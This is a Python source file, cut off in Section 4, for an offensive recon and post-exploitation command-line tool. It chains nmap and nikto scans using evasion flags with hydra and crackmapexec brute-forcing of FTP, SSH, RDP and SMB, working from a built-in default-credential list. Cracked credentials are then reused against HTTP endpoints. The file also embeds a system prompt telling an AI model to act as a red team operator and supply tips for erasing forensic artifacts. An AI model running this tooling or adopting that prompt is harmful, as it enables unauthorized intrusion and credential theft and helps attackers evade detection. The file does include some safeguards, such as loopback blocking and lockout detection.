#!/usr/bin/env python3
"""
dig_champs.py — Full-spectrum recon & post-exploitation CLI

Sections:
  1  Core Utilities        shared helpers, session/resume
  2  Recon Scans           nmap (+IPv6), nikto, whatweb, enum4linux, dnsrecon
  3  Credential Attacks    hydra/cme + lockout detection + HTTP deepening
  4  CVE Artifact Analysis Claude-powered forensic artifact reasoning (batched)
  5  Vuln Report           NVD / OSV / Go Vuln DB / CVE Program top-10
  6  High-Value File Hunt  nmap NSE + SMB share enumeration
  7  Web Fuzzing           gobuster/ffuf/feroxbuster dir + vhost brute
  8  Post-Auth Enum        SSH/FTP shell enum after cred success
  9  Vuln Probe            nmap --script vuln service confirmation
  10 Report Save           JSON + Markdown + terminal summary
  11 Live Adapt Engine     rule-based + Claude strategic advisor
  12 Argument Parser
  13 Scan Trajectory       machine log · human narrative · audit diff
  14 Main Orchestrator

Usage (interactive):   python3 dig_champs.py
Usage (argparse):      python3 dig_champs.py -t <target> [options]

Requires system tools: nmap, nikto, enum4linux, whatweb, dnsrecon
Requires pip packages: requests rich anthropic
Optional tools:        hydra, crackmapexec, searchsploit,
                       gobuster or ffuf or feroxbuster, ssh (openssh-client)
"""

# ══════════════════════════════════════════════════════════════════════════════
# IMPORTS
# ══════════════════════════════════════════════════════════════════════════════

import argparse
import hashlib
import ipaddress
import json
import os
import re
import secrets
import shutil
import socket
import statistics
import subprocess
import sys
import tempfile
import threading
import time
from datetime import datetime
from pathlib import Path

# ── Vendor path injection — auto-loads _vendor/ if present ───────────────────
# Populated by: python3 build_vendor.py  (run once on an internet-connected machine)
_HERE   = os.path.dirname(os.path.abspath(__file__))
_VENDOR = os.path.join(_HERE, "_vendor")
if os.path.isdir(_VENDOR):
    sys.path.insert(0, _VENDOR)

# ── Dependency import waterfall ───────────────────────────────────────────────
# Tier 1: real pip packages (or vendored copies loaded via _vendor/ above)
# Tier 2: stdlib-based companion stubs bundled alongside this script
# Tier 3: hard exit with instructions
try:
    import requests
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich import box
except ImportError:
    try:
        sys.path.insert(0, _HERE)
        import _dc_http as requests            # type: ignore[no-redef]
        from _dc_rich import Console, Panel, Table, box  # type: ignore[no-redef]
    except ImportError:
        sys.exit(
            "[!] Missing deps. Options:\n"
            "    1) pip install requests rich\n"
            "    2) python3 build_vendor.py    (populates _vendor/ for air-gapped use)\n"
            "    3) ensure _dc_http.py and _dc_rich.py are alongside this script"
        )

try:
    import anthropic
except ImportError:
    anthropic = None  # type: ignore  # Claude features disabled if not installed

try:
    from wan_si_tong import collate_findings as _wst_collate
    from wan_si_tong import TrajectoryPathDesigner as _WstPathDesigner
    from wan_si_tong import EngagementTracker as _WstTracker
    from wan_si_tong import OSRouter as _WstRouter
    _WST_AVAILABLE = True
except ImportError:
    _WST_AVAILABLE = False


console = Console()

# ── Early environment checks ──────────────────────────────────────────────────
_ANTHROPIC_KEY_PRESENT: bool = (
    anthropic is not None
    and bool(os.environ.get("ANTHROPIC_API_KEY", "").strip())
)
_OFFLINE_MODE: bool    = False  # set by --offline flag or auto-detect in main()
_AFK_MODE:     bool    = False  # set by AFK prompt in interactive_prompt()
_PROMPT_TIMEOUT: int   = 30     # seconds before a prompt auto-accepts its default


def _detect_internet(timeout: float = 2.0) -> bool:
    """Quick TCP probe to 8.8.8.8:53. Returns False if unreachable."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect(("8.8.8.8", 53))
        s.close()
        return True
    except OSError:
        return False

# ══════════════════════════════════════════════════════════════════════════════
# SECTION 0 — PIPELINE AUTHORITY  (data flow contract)
# ══════════════════════════════════════════════════════════════════════════════
#
# All queue-influencing mechanisms are tiered. Higher tiers act only on phases
# not yet executed. No tier can re-add a completed phase (_executed set enforces
# this). Data flows forward only — no tier reads from a tier that comes after it.
#
# ┌─────────────────────────────────────────────────────────────────┐
# │  TIER 0 — PRE-SCAN (wan_si_tong + TrajectoryPathDesigner)       │
# │  Sets the initial phase_queue from nmap findings.               │
# │  Currently: hardcoded queue; PathDesigner is a future stub.     │
# └──────────────────────────┬──────────────────────────────────────┘
#                            │ initial_queue
#                            ▼
# ┌─────────────────────────────────────────────────────────────────┐
# │  TIER 1 — STRATEGIC REORDER (claude_strategic_advisor)          │
# │  Called ONCE after creds, before the dynamic loop.              │
# │  Rewrites the full scannable-phase order via Claude.            │
# │  Operator --no-artifacts flag or missing API key disables tier. │
# └──────────────────────────┬──────────────────────────────────────┘
#                            │ strategic_queue
#                            ▼
# ┌─────────────────────────────────────────────────────────────────┐
# │  TIER 2 — REACTIVE MICRO-ADJUST (live_adapt_rules)              │
# │  Called after EVERY phase. Can only pull phases forward in the  │
# │  remaining queue — never re-inserts a completed phase.          │
# └──────────────────────────┬──────────────────────────────────────┘
#                            │ findings accumulate
#                            ▼
# ┌─────────────────────────────────────────────────────────────────┐
# │  TIER 3 — POST-SCAN ARTIFACTS (terminal, no feedback to scan)   │
# │  save_report → narrative → audit diff → wan_si_tong post-scan.  │
# │  These run after the loop and cannot affect the queue.          │
# └──────────────────────────┬──────────────────────────────────────┘
#                            │ <sdir>/ artifacts written (read-only after)
#                            ▼
# ┌─────────────────────────────────────────────────────────────────┐
# │  TIER 4 — REVIEW (dg_auditor — completely separate process)     │
# │  Reads <sdir>/ artifacts. Never writes back. No feedback loop.  │
# └─────────────────────────────────────────────────────────────────┘
#
# Authority table:
#   Tier  Mechanism                  Scope            Authority
#   0     wan_si_tong + PathDesigner Full queue        Sets initial order
#   1     claude_strategic_advisor   Scannable only    Overwrites Tier 0 once
#   2     live_adapt_rules           Remaining only    Pull-forward only
#   —     Operator --no-X flags      Any phase         Veto over all tiers

# ══════════════════════════════════════════════════════════════════════════════
# SECTION 1 — CORE UTILITIES  (shared across all modules)
# ══════════════════════════════════════════════════════════════════════════════
#
# Shared helpers used by every other section.
#   avail(cmd)               — checks whether a tool exists in PATH (shutil.which)
#   run_cmd(args, out, ...)  — subprocess wrapper; writes stdout to file + records timing
#   read_file / write_lines  — thin I/O wrappers for text files
#   phase_out(sdir, name)    — canonical path for a phase output file in <sdir>/
#   phase_done(sdir, p)      — True if .done_<p> marker exists in <sdir>/
#   mark_done(sdir, p)       — creates .done_<p> marker (idempotent, enables resume)
#   save_session_meta()      — writes session.json to <sdir>/ at scan start
#   _phase_sleep(delay, p)   — inter-phase sleep (mode-dependent, respects --delay)
#
# Session directory layout: ~/.dc_sessions/<target>_<ts>/
#   session.json             — scan args + start timestamp
#   .done_<phase>            — existence = phase complete; delete to force re-run
#   <phase>_<name>.txt/json  — per-phase raw output and cached results

BLOCKED = {"127.0.0.1", "0.0.0.0", "255.255.255.255", "::1", "localhost"}


def ok(t: str) -> str | None:
    """Validate and resolve a target; reject loopback / broadcast / multicast."""
    if t in BLOCKED:
        console.print("[red][!] Refusing to scan loopback/broadcast.[/red]")
        return None
    try:
        a = ipaddress.ip_address(t)
        if a.is_loopback or a.is_unspecified or a.is_multicast:
            console.print("[red][!] Refusing to scan loopback/broadcast.[/red]")
            return None
        return t
    except ValueError:
        pass
    try:
        resolved = socket.gethostbyname(t)
        a = ipaddress.ip_address(resolved)
        if a.is_loopback or a.is_unspecified or a.is_multicast:
            console.print("[red][!] Refusing to scan loopback/broadcast.[/red]")
            return None
        if a.is_private:
            console.print(
                f"[yellow][!] Warning: {t} resolves to private IP {resolved} — proceeding.[/yellow]"
            )
        return resolved
    except socket.error:
        return None


def need(tool: str):
    """Exit if a required system tool is missing."""
    if not shutil.which(tool):
        console.print(f"[red][!] Required tool missing: {tool}[/red]")
        sys.exit(1)


def avail(tool: str) -> bool:
    return bool(shutil.which(tool))


def read_file(path: str, max_mb: int = 10) -> str:
    """Read a file up to max_mb; warn if truncated."""
    if not os.path.exists(path):
        console.print(f"[yellow][!] No output: {path}[/yellow]")
        return ""
    limit = max_mb * 1024 * 1024
    if os.path.getsize(path) > limit:
        console.print(f"[yellow][!] Output suspiciously large, truncating: {path}[/yellow]")
    return open(path, errors="ignore").read(limit)


def sanitize(s: str) -> str:
    return re.sub(r"[^\w\s\-\./]", "", str(s))[:80]


def run_cmd(args: list[str], out: str, timeout: int = 3600, tool_label: str = "") -> bool:
    console.print(f"[dim][+] {' '.join(args)}[/dim]")
    try:
        with open(out, "w") as f:
            r = subprocess.run(
                args, stdout=f, stderr=subprocess.DEVNULL, text=True, timeout=timeout
            )
        # Warn if the output file is suspiciously empty
        size = os.path.getsize(out) if os.path.exists(out) else 0
        if size == 0:
            label = tool_label or args[0]
            console.print(
                f"[yellow][!] {label} produced no output — "
                f"firewall drop, tool error, or target not responding?[/yellow]"
            )
        return r.returncode == 0
    except subprocess.TimeoutExpired:
        label = tool_label or args[0]
        console.print(f"[yellow][!] {label} timed out after {timeout}s[/yellow]")
        return False
    except FileNotFoundError:
        console.print(f"[red][!] Tool not found: {args[0]}[/red]")
        return False
    except KeyboardInterrupt:
        label = tool_label or args[0]
        console.print(f"[yellow][!] {label} interrupted — skipping, continuing scan[/yellow]")
        return False


# ── Session / resume helpers ──────────────────────────────────────────────────

SESSION_PHASES = [
    "nmap", "nikto", "whatweb", "enum4linux", "dnsrecon",
    "creds", "filehunt", "vulnreport", "artifacts",
]


def session_dir(target: str, resume_path: str | None = None) -> str:
    """
    Return (and create) a stable per-target session directory.
    If resume_path is given, validate it and return it directly.
    Otherwise create a new timestamped dir under ~/.dc_sessions/.
    On creation, write session.json so --resume can replay args.
    """
    if resume_path:
        p = Path(resume_path)
        if not p.is_dir():
            console.print(f"[red][!] Resume path not found: {resume_path}[/red]")
            sys.exit(1)
        console.print(f"[bold yellow][~] Resuming session: {resume_path}[/bold yellow]")
        meta_path = p / "session.json"
        if meta_path.exists():
            try:
                meta = json.loads(meta_path.read_text())
                console.print(
                    f"[dim][~] Original run: target={meta.get('target')} "
                    f"mode={meta.get('mode')} started={meta.get('started')}[/dim]"
                )
            except Exception:
                pass
        return str(p)
    base = Path.home() / ".dc_sessions"
    base.mkdir(mode=0o700, exist_ok=True)
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    sdir = base / f"{target}_{ts}"
    sdir.mkdir(mode=0o700)
    sdir.chmod(0o700)  # Explicit chmod overrides process umask
    console.print(f"[dim][~] Session dir: {sdir}[/dim]")
    return str(sdir)


def save_session_meta(sdir: str, args_dict: dict):
    """Persist args to session.json so a --resume run can show what was used."""
    meta = {**args_dict, "started": datetime.now().isoformat()}
    try:
        (Path(sdir) / "session.json").write_text(json.dumps(meta, indent=2))
    except Exception:
        pass


def phase_done(sdir: str, phase: str) -> bool:
    return (Path(sdir) / f".done_{phase}").exists()


def mark_done(sdir: str, phase: str):
    (Path(sdir) / f".done_{phase}").touch()


def phase_out(sdir: str, filename: str) -> str:
    return str(Path(sdir) / filename)


def load_phase(sdir: str, filename: str) -> str:
    path = phase_out(sdir, filename)
    if os.path.exists(path):
        return read_file(path)
    return ""


# ══════════════════════════════════════════════════════════════════════════════
# SECTION 2 — RECON SCANS  (from dig_champs_mini)
# ══════════════════════════════════════════════════════════════════════════════
#
# Static recon phases — run once in fixed order before the dynamic queue.
#   run_nmap()        — SYN/TCP port scan + service version detection
#                       Mode 1=quiet (-T2), Mode 4=aggressive (-T4 + extra scripts)
#                       Output: raw nmap text; parse_recon() extracts structured findings
#   run_nikto()       — HTTP vulnerability scanner against detected web ports
#   run_whatweb()     — web technology fingerprinting (CMS, frameworks, headers)
#   run_enum4linux()  — SMB/Samba share/user/policy enumeration (enum4linux-ng)
#   run_dnsrecon()    — DNS record enumeration + zone transfer attempt
#   parse_recon()     — normalises all recon output into finding dicts (src="dc_recon")
#
# Feeds into: nmap_output str → §3 (creds), §6 (HVF), §7 (webfuzz), §9 (vulnprobe)
#             findings list extended with structured recon entries

# ── Port profiles ────────────────────────────────────────────────────────────
# Pentest-grade port list: top 1000 + common non-standard service ports
PENTEST_PORTS = (
    "1-1024,"
    "1080,1433,1521,1723,2049,2121,2222,2375,2376,3000,3306,3389,3391,"
    "4443,4848,5000,5432,5900,5985,5986,6379,6443,7001,7443,8000,8008,"
    "8080,8081,8443,8444,8888,8983,9000,9090,9200,9300,10000,27017,27018,"
    "49152-49200"
)


def nmap_scan(target: str, mode: int, sdir: str, ports: str | None = None) -> str:
    flags = {
        1: ["-T1", "-f", "--data-length", "25"],
        2: ["-T2", "-f"],
        3: ["-T4"],
        4: ["-T5", "--min-rate", "1000"],
    }[mode]
    out    = phase_out(sdir, "nmap.txt")
    xmlout = phase_out(sdir, "nmap.xml")
    port_arg = ports or PENTEST_PORTS
    # Detect IPv6 and pass -6 flag
    ipv6_flags: list[str] = []
    try:
        if ipaddress.ip_address(target).version == 6:
            ipv6_flags = ["-6"]
    except ValueError:
        pass
    run_cmd(
        ["nmap", "-sV", "-O"] + ipv6_flags + ["-p", port_arg]
        + flags
        + ["-oN", out, "-oX", xmlout, target],
        out, tool_label="nmap",
    )
    return read_file(out)


def parse_os_fingerprint(nmap_output: str) -> dict:
    """Extract the best OS guess and CPE strings from nmap output."""
    os_info: dict = {"os_guess": "", "os_accuracy": "", "cpe": []}
    # "OS details: ..." line
    for line in nmap_output.splitlines():
        if line.startswith("OS details:"):
            os_info["os_guess"] = line.replace("OS details:", "").strip()
        m = re.search(r"Aggressive OS guesses:\s*(.+?)(?:\s*\((\d+)%\))?$", line)
        if m and not os_info["os_guess"]:
            os_info["os_guess"]    = m.group(1).strip()
            os_info["os_accuracy"] = (m.group(2) or "") + "%"
        if "cpe:/" in line.lower():
            for cpe in re.findall(r"cpe:/\S+", line, re.IGNORECASE):
                if cpe not in os_info["cpe"]:
                    os_info["cpe"].append(cpe)
    return os_info


def nikto_scan(target: str, mode: int, sdir: str) -> str:
    flags = {
        1: ["-Delay", "5", "-evasion", "1"],
        2: ["-Delay", "2"],
        3: [],
        4: ["-Delay", "0"],
    }[mode]
    out = phase_out(sdir, "nikto.txt")
    run_cmd(["nikto", "-h", target] + flags, out, tool_label="nikto")
    return read_file(out)


def enum_scan(target: str, sdir: str) -> str:
    out = phase_out(sdir, "enum.txt")
    run_cmd(["enum4linux", "-a", target], out, timeout=900, tool_label="enum4linux")
    return read_file(out)


def whatweb_scan(target: str, sdir: str) -> str:
    out = phase_out(sdir, "whatweb.txt")
    run_cmd(["whatweb", "--no-errors", "-a", "3", target], out, tool_label="whatweb")
    return read_file(out)


def dnsrecon_scan(target: str, sdir: str) -> str:
    out = phase_out(sdir, "dnsrecon.txt")
    run_cmd(["dnsrecon", "-d", target, "-t", "std"], out, tool_label="dnsrecon")
    return read_file(out)


def parse_recon(
    nmap: str, nikto: str, enum4: str, whatweb: str = "", dns: str = ""
) -> list[dict]:
    """Parse raw tool output into structured findings list."""
    findings = []

    for line in nmap.splitlines():
        m = re.search(r"(\d+)/(tcp|udp)\s+open\s+(\S+)(?:\s+(.+))?", line)
        if m:
            f: dict = {"port": m.group(1), "proto": m.group(2), "service": m.group(3), "src": "nmap"}
            if m.group(4):
                ver = re.sub(r"\s*\(.*\)\s*$", "", m.group(4)).strip()
                if ver:
                    f["version"] = ver
            findings.append(f)

    # OS fingerprint — store as a single finding so it ends up in the report
    os_info = parse_os_fingerprint(nmap)
    if os_info["os_guess"]:
        findings.append({
            "os_guess":    os_info["os_guess"],
            "os_accuracy": os_info["os_accuracy"],
            "cpe":         os_info["cpe"],
            "src":         "nmap-os",
        })
        console.print(
            f"[bold cyan][+] OS fingerprint: [white]{os_info['os_guess']}[/white]"
            + (f"  ({os_info['os_accuracy']})" if os_info["os_accuracy"] else "")
            + "[/bold cyan]"
        )

    for line in nikto.splitlines():
        c = re.search(r"(CVE-\d+-\d+)", line)
        if c:
            findings.append({"cve": c.group(1), "evidence": line.strip(), "src": "nikto"})
        if "outdated" in line.lower():
            findings.append({"issue": "outdated software", "evidence": line.strip(), "src": "nikto"})
        for s in [".env", ".git", "id_rsa", ".bak", "backup", "admin", "wp-admin"]:
            if s in line.lower():
                findings.append({"juicy": s, "evidence": line.strip(), "src": "nikto"})
                break

    for line in whatweb.splitlines():
        for kw in ["cms", "wordpress", "joomla", "drupal", "jquery", "bootstrap",
                   "php", "apache", "nginx", "iis"]:
            if kw in line.lower():
                findings.append({"tech": kw, "evidence": line.strip(), "src": "whatweb"})
                break

    for line in dns.splitlines():
        for kw in ["zone transfer", "axfr", "a ", "cname", "mx ", "txt "]:
            if kw in line.lower():
                findings.append({"dns": kw.strip(), "evidence": line.strip(), "src": "dnsrecon"})
                break

    if "anonymous login successful" in enum4.lower():
        findings.append({"issue": "SMB null session", "src": "enum4linux"})
    for u in re.findall(r"user:\[(.*?)\]", enum4):
        findings.append({"user": u, "src": "enum4linux"})

    return findings


def _version_query(version: str) -> str:
    """Extract 'Product major.minor' from a nmap version string for searchsploit."""
    parts = version.split()
    if not parts:
        return ""
    product = parts[0]
    for p in parts[1:]:
        m = re.match(r"(\d+\.\d+)", p)
        if m:
            return f"{product} {m.group(1)}"
    return product


def run_searchsploit(findings: list[dict]):
    queries = set()
    for f in findings:
        if "cve" in f:
            queries.add(sanitize(f["cve"]))
        if "version" in f:
            q = _version_query(f["version"])
            if q:
                queries.add(sanitize(q))
        if "issue" in f and f["issue"] not in ("outdated software",):
            queries.add(sanitize(f["issue"]))
    if not queries:
        console.print("[dim][~] No searchsploit queries found.[/dim]")
        return
    for q in queries:
        console.print(f"\n[bold][+] searchsploit {q}[/bold]")
        r = subprocess.run(["searchsploit", q], capture_output=True, text=True)
        console.print(r.stdout if r.stdout.strip() else "  (no results)")


# ══════════════════════════════════════════════════════════════════════════════
# SECTION 3 — CREDENTIAL ATTACKS  (from dc_creds)
# ══════════════════════════════════════════════════════════════════════════════
#
# Brute-force credential attacks against services detected by nmap.
#   detect_cred_services()  — parses nmap_output for FTP/SSH/RDP/SMB/HTTP open ports
#   load_loot()             — loads a credential list from a user-supplied file
#   DEFAULT_CREDS           — built-in common/default credential pairs
#   _run_hydra()            — hydra wrapper for network brute-force
#   _run_cme()              — crackmapexec wrapper for SMB/WinRM attacks
#   _http_auth_probe()      — requests-based HTTP basic-auth probe (no external tool)
#   run_creds()             — orchestrates all attacks; returns list of cracked creds
#
# Output: cred_results = [{"user":.., "password":.., "service":.., "port":..}, ...]
# Feeds into: §6 cred_hits (SMB + FTP auth), §8 cred_results (postauth session enum),
#             §11 live_adapt_rules (creds trigger postauth/filehunt promotion),
#             §13 TrajectoryRecorder (creds phase event + adapt labels)

DEFAULT_CREDS = [
    "admin:admin", "admin:password", "admin:1234", "admin:12345", "admin:123456",
    "admin:", "admin:Password1", "admin:Admin123", "root:root", "root:toor",
    "root:password", "root:", "root:alpine", "guest:guest", "guest:",
    "user:user", "user:password", "administrator:administrator",
    "administrator:password", "administrator:Password1", "administrator:Admin1234",
    "test:test", "test:password", "ftp:ftp", "anonymous:anonymous", "anonymous:",
    "pi:raspberry", "ubuntu:ubuntu", "vagrant:vagrant", "service:service",
    "support:support", "operator:operator", "netadmin:netadmin", "cisco:cisco",
    "cisco:admin", "sa:", "sa:sa", "postgres:postgres", "mysql:mysql", "oracle:oracle",
]

SERVICE_PORTS = {"ftp": [21], "ssh": [22], "rdp": [3389], "smb": [445, 139]}

NMAP_SERVICE_MAP = {
    "ftp": "ftp", "ftp-data": "ftp",
    "ssh": "ssh", "openssh": "ssh",
    "microsoft-ds": "smb", "netbios-ssn": "smb",
    "ms-wbt-server": "rdp", "rdp": "rdp",
}

HYDRA_MODULE = {"ftp": "ftp", "ssh": "ssh", "rdp": "rdp", "smb": "smb"}

# mode → (hydra threads, timeout secs, jitter secs)
CREDS_MODE_PARAMS = {
    1: ("2", 600, 5),
    2: ("4", 480, 3),
    3: ("8", 300, 1),
    4: ("16", 180, 0),
}


def write_lines(lines: list[str], path: str):
    Path(path).write_text("\n".join(lines))


def load_loot(loot_path: str) -> list[str]:
    if not os.path.exists(loot_path):
        console.print(f"[red][!] Loot file not found: {loot_path}[/red]")
        return []
    creds = []
    with open(loot_path, errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if re.match(r"^[a-fA-F0-9]{32,}$", line):
                continue
            m = re.search(r"(\S+)\s*/\s*(\S+)", line)
            if m:
                creds.append(f"{m.group(1)}:{m.group(2)}")
                continue
            if ":" in line:
                u, p = line.split(":", 1)
                if len(p) <= 64:
                    creds.append(line)
    deduped = list(dict.fromkeys(creds))
    console.print(f"[green][+] Loaded {len(deduped)} credential pairs from loot[/green]")
    return deduped


def parse_hydra(path: str, service: str, port: int) -> list[dict]:
    if not os.path.exists(path):
        return []
    results = []
    with open(path, errors="ignore") as f:
        for line in f:
            m = re.search(r"login:\s*(\S*)\s+password:\s*(.*)", line)
            if m:
                results.append(
                    {"user": m.group(1), "password": m.group(2).strip(),
                     "service": service, "port": port}
                )
    return results


def save_cred_results(target: str, results: list[dict]) -> str:
    outdir = Path.home() / ".dc_reports"
    outdir.mkdir(mode=0o700, exist_ok=True)
    fn = outdir / f"{secrets.token_hex(8)}_creds.json"
    fn.write_text(json.dumps({"target": target, "credentials": results}, indent=2))
    fn.chmod(0o600)
    return str(fn)


LOCKOUT_PATTERNS = [
    r"account.*lock", r"too many.*attempt", r"locked out",
    r"account.*disabled", r"intruder.*detect", r"login.*blocked",
    r"temporarily.*unavailable", r"account.*suspended",
]


def _check_lockout(text: str) -> bool:
    """Return True if output suggests account lockout is occurring."""
    lower = text.lower()
    return any(re.search(p, lower) for p in LOCKOUT_PATTERNS)


def hydra_attack(
    target: str, service: str, port: int, cred_file: str, mode: int, tmpdir: str
) -> list[dict]:
    if not avail("hydra"):
        console.print("[yellow][!] hydra missing — skipping[/yellow]")
        return []
    threads, timeout, _ = CREDS_MODE_PARAMS[mode]
    out = os.path.join(tmpdir, f"hydra_{service}_{port}.txt")
    t = "4" if service == "rdp" else threads
    args = ["hydra", "-C", cred_file, "-s", str(port), "-t", t,
            "-o", out, "-q", target, HYDRA_MODULE[service]]
    console.print(f"[dim][+] {' '.join(args)}[/dim]")
    try:
        r = subprocess.run(
            args, capture_output=True, text=True, timeout=timeout
        )
        combined = (r.stdout or "") + (r.stderr or "")
        if _check_lockout(combined):
            console.print(
                f"[bold red][!] LOCKOUT DETECTED on {service}:{port} — "
                f"aborting attack to protect accounts![/bold red]"
            )
            return []
        # Write output for parse_hydra
        if os.path.exists(out):
            pass  # -o already wrote it
        else:
            Path(out).write_text(r.stdout or "")
    except subprocess.TimeoutExpired:
        console.print(f"[yellow][!] hydra timed out on {service}:{port}[/yellow]")
    return parse_hydra(out, service, port)


def cme_attack(
    target: str, port: int, cred_file: str, mode: int, tmpdir: str
) -> list[dict]:
    cme = next((t for t in ["crackmapexec", "cme"] if avail(t)), None)
    if not cme:
        console.print("[yellow][!] crackmapexec/cme missing — falling back to hydra smb[/yellow]")
        return hydra_attack(target, "smb", port, cred_file, mode, tmpdir)

    pairs = [l.strip() for l in Path(cred_file).read_text().splitlines() if ":" in l]
    users = list(dict.fromkeys(p.split(":")[0] for p in pairs))
    passs = list(dict.fromkeys(p.split(":", 1)[1] for p in pairs))
    u_file = os.path.join(tmpdir, "smb_u.txt")
    p_file = os.path.join(tmpdir, "smb_p.txt")
    write_lines(users, u_file)
    write_lines(passs, p_file)

    _, timeout, jitter = CREDS_MODE_PARAMS[mode]
    args = [cme, "smb", target, "-u", u_file, "-p", p_file,
            "--no-bruteforce", "--continue-on-success"]
    if jitter:
        args += ["--jitter", str(jitter)]
    console.print(f"[dim][+] {' '.join(args)}[/dim]")

    results = []
    try:
        r = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
        combined = (r.stdout or "") + (r.stderr or "")
        if _check_lockout(combined):
            console.print(
                f"[bold red][!] LOCKOUT DETECTED on smb:{port} — "
                f"aborting attack to protect accounts![/bold red]"
            )
            return []
        for line in r.stdout.splitlines():
            if "[+]" in line:
                m = re.search(r"\\(\S+)\s+(\S+)(?:\s|$)", line)
                if m:
                    results.append(
                        {"user": m.group(1), "password": m.group(2),
                         "service": "smb", "port": port}
                    )
    except subprocess.TimeoutExpired:
        console.print(f"[yellow][!] crackmapexec timed out on smb:{port}[/yellow]")
    return results


def detect_cred_services(nmap_output: str) -> list[dict]:
    found, seen = [], set()
    for line in nmap_output.splitlines():
        m = re.search(r"(\d+)/(tcp|udp)\s+open\s+(\S+)", line)
        if not m:
            continue
        port, svc_raw = int(m.group(1)), m.group(3).lower()
        canonical = NMAP_SERVICE_MAP.get(svc_raw)
        if not canonical:
            for svc, ports in SERVICE_PORTS.items():
                if port in ports:
                    canonical = svc
                    break
        if canonical and (canonical, port) not in seen:
            seen.add((canonical, port))
            found.append({"service": canonical, "port": port})
    return found


def _http_auth_probe(target: str, port: int, creds: list[dict], nmap_output: str) -> list[dict]:
    """
    Try cracked credentials against HTTP basic-auth and common login endpoints.
    Uses hydra http-get and http-post-form if available; falls back to requests.
    """
    results = []
    # Determine scheme
    scheme = "https" if str(port) in ("443", "8443", "4443") else "http"
    base_url = f"{scheme}://{target}:{port}"

    # Quick requests-based basic-auth probe first (no extra tools needed)
    for c in creds:
        user, passwd = c["user"], c["password"]
        try:
            r = requests.get(
                base_url, auth=(user, passwd), timeout=6,
                verify=False, allow_redirects=True,
            )
            if r.status_code not in (401, 403):
                console.print(
                    f"    [bold green]✓  HTTP basic-auth {user}:[REDACTED] → "
                    f"{scheme}:{port} (HTTP {r.status_code})[/bold green]"
                )
                results.append({
                    "user": user, "password": passwd,
                    "service": "http", "port": port,
                    "detail": f"basic-auth HTTP {r.status_code}",
                })
        except Exception:
            pass
    return results


def run_creds(
    target: str, mode: int, nmap_output: str, loot_path: str | None = None
) -> list[dict]:
    services = [
        s for s in detect_cred_services(nmap_output) if s["service"] in SERVICE_PORTS
    ]
    if not services:
        console.print("[dim][~] No targetable services (FTP/SSH/RDP/SMB) — skipping creds[/dim]")
        return []

    console.print(
        "\n[bold][+] Credential targets: "
        + ", ".join(f"{s['service']}:{s['port']}" for s in services)
        + "[/bold]"
    )

    loot = load_loot(loot_path) if loot_path else []
    if not loot_path:
        console.print("[dim][~] No loot file — using default/common credentials only[/dim]")
    defaults = [c for c in DEFAULT_CREDS if c not in loot]
    all_creds = loot + defaults

    all_results = []
    with tempfile.TemporaryDirectory() as tmpdir:
        os.chmod(tmpdir, 0o700)
        cred_file = os.path.join(tmpdir, "creds.txt")
        write_lines(all_creds, cred_file)

        for svc in services:
            service, port = svc["service"], svc["port"]
            console.print(f"\n[bold][+] Attacking {service}:{port}…[/bold]")
            results = (
                cme_attack(target, port, cred_file, mode, tmpdir)
                if service == "smb"
                else hydra_attack(target, service, port, cred_file, mode, tmpdir)
            )
            if results:
                console.print(f"[red][!] {len(results)} hit(s) on {service}:{port}[/red]")
                for r in results:
                    console.print(f"    [bold green]✓  {r['user']}:[REDACTED][/bold green]")
            else:
                console.print(f"[dim][-] No credentials found on {service}:{port}[/dim]")
            all_results.extend(results)

    # ── Deepen: try cracked creds against HTTP ports ──────────────────────
    if all_results:
        http_ports = []
        for line in nmap_output.splitlines():
            m = re.search(r"(\d+)/tcp\s+open\s+(\S+)", line)
            if m and any(kw in m.group(2).lower()
                         for kw in ["http", "https", "nginx", "apache", "iis", "web"]):
                http_ports.append(int(m.group(1)))
        # Also check standard ports even if service name wasn't recognised
        for stdport in (80, 443, 8080, 8443, 8000, 8888):
            if stdport not in http_ports and f"{stdport}/tcp" in nmap_output:
                http_ports.append(stdport)

        if http_ports:
            console.print("\n[bold][+] Re-using cracked creds against HTTP endpoints…[/bold]")
            for hport in http_ports:
                http_hits = _http_auth_probe(target, hport, all_results, nmap_output)
                all_results.extend(http_hits)

    if all_results:
        fn = save_cred_results(target, all_results)
        console.print(f"\n[green][+] Credentials saved → {fn}[/green]")

    return all_results


# ══════════════════════════════════════════════════════════════════════════════
# SECTION 4 — CVE ARTIFACT ANALYSIS  (from dc_artifacts)
# ══════════════════════════════════════════════════════════════════════════════
#
# Claude-powered forensic artifact analysis for confirmed CVEs (batched API call).
#   fetch_cve(id)             — retrieves CVE descriptor from NVD REST API v2.0
#   print_cve_header()        — rich table showing CVSS score + attack vector
#   ARTIFACT_BATCH_SYSTEM     — Claude system prompt for batched multi-CVE analysis
#   analyze_artifacts()       — sends a single CVE dict to Claude (used standalone)
#   print_artifact_analysis() — rich display of IoCs, detection tools, kill-chain
#   run_artifacts_lookup()    — MAIN ENTRY: batch-fetches all CVEs then one Claude call
#                               Returns findings with src="dc_artifacts"
#
# Takes input from: §5 vulnreport_top10 CVE IDs (preferred), or raw findings CVE fields
# Feeds into: main findings list (artifact_type="narrative" + per-CVE "cve_analysis")
# Gap 6 note: .done_artifacts cache in main() prevents re-querying Claude on resume

ARTIFACT_SYSTEM_PROMPT = """You are a senior red team operator and forensic analyst.
Your job is to identify the forensic artifacts — on both attacker and victim machines —
that would betray the use of a specific CVE exploit during a penetration test or real attack.

When given CVE details, produce a structured JSON object (and ONLY that JSON, no markdown fences) with this exact schema:
{
  "exploit_class": "<brief exploit category, e.g. RCE via buffer overflow>",
  "attack_phases": ["<phase1>", "<phase2>", ...],
  "victim_artifacts": [
    {
      "artifact": "<name/path/description>",
      "type": "<log|file|registry|memory|network|process>",
      "os": "<Windows|Linux|Both|Any>",
      "detail": "<why this is created and what it shows>",
      "evasion_tip": "<one-line tip to reduce/remove this artifact>"
    }
  ],
  "attacker_artifacts": [
    {
      "artifact": "<name/path/description>",
      "type": "<log|file|network|memory>",
      "detail": "<why this artifact exists on the attacker machine>",
      "evasion_tip": "<one-line tip>"
    }
  ],
  "detection_tools": ["<tool that would catch this>", ...],
  "iocs": ["<indicator of compromise string or pattern>", ...]
}

Be specific and realistic. Prefer concrete file paths, registry keys, event IDs, and log patterns over vague descriptions.
